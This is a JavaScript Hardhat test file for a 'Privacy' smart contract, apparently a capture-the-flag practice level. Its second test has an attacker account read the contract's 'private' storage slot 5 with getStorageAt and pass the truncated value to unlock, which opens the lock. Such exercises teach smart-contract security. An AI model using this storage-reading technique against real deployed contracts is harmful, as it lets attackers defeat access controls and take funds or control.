const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Privacy", () => {
  before(async function () {
    this.PrivacyFactory = await ethers.getContractFactory("Privacy");
    [owner, attacker, user] = await ethers.getSigners();
    (this.owner = owner), (this.user = user), (this.attacker = attacker);
  });

  beforeEach(async function () {
    let data = new Array(3);
    const dataLength = data.length;
    for (let i = dataLength; i--; ) {
      data[i] = ethers.utils.formatBytes32String("t" + Math.random());
    }
    this.privacyContract = await this.PrivacyFactory.deploy(data);
    await this.privacyContract.deployed();
  });

  it("Contract should be locked initially", async function () {
    expect(await this.privacyContract.locked()).to.equal(true);
  });

  it("Attacker should be able to unlock the contract", async function () {
    //connect with the attacker account
    this.privacyContract = await this.privacyContract.connect(this.attacker);
    this.privacyContract.unlock(
      (
        await ethers.provider.getStorageAt(this.privacyContract.address, 5)
      ).substring(0, 34)
    );
    expect(await this.privacyContract.locked()).to.equal(false);
  });
});
